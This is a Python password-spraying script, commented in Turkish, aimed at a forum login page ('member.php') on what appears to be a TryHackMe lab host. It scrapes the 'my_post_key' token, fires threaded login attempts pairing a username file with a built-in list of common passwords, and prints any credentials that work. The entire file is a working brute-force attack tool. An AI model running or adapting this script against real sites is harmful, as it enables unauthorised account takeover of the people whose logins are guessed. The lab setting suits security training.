"""
Bu kod, username.txt içindeki isim listesini ve listPassword listesi
içinde yer alan password' leri sıra ile dener. Giriş yapılıp yapılmadığını, sayfanın verdiği hata
mesajı ile kontrol eder. Gelen request içinde bu hata mesajı yer almıyorsa password doğrudur. 
Kullanıcı adı ile password eşleştirilir.
Bu şekilde brute force ile tüm user'lara ait password değerleri HTML istekleri ile bulunarak yansıtılır.
"""
import requests
from threading import Thread
from time import sleep
import re

class Sprayer:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, username, password):
        # Create a new requests session object
        session = requests.Session()
        
        # Fetch the my_post_key value
        my_post_keyRequestResult = session.get(self.__url)
        matched = re.search(r'var my_post_key = "([0-9a-f]+)";' , my_post_keyRequestResult.text)
        my_post_key = matched.group(1)
        
        # Construct POST requests
        loginData = {
            'username': username,
            'password': password,
            'submit': 'Login',
            'action': 'do_login',
            'url': '',
            'my_post_key': my_post_key
        }

        loginRequestResult = session.post(self.__url, data=loginData)
        print(f'[*] Trying user: {username:20s}', end='\r')

        if 'Please correct the following errors before continuing:' not in loginRequestResult.text:
            print(f'[+] Found valid credentials: {username}:{password}')

def main():
    url = 'http://exit-denied.thm/member.php'
    sprayer = Sprayer(url)

    listPassword = ['password123', 'Password123', 'crabfish', 'linux123', 'secret', 'piggybank', 'windowsxp', 'starwars', 'qwerty123', 'qwerty', 'supermario', 'Luisfactor05', 'james123']
    userWordlist = 'username.txt'

    with open(userWordlist, 'r') as file:
        for line in file:
            username = line.strip()
            for password in listPassword:
                thread = Thread(target=sprayer.sendRequest, args=(username, password))
                thread.start()
        
                # You can adjust how fast of each thread. 0.5s is recommended.
                sleep(0.5)

if __name__ == '__main__':
    main()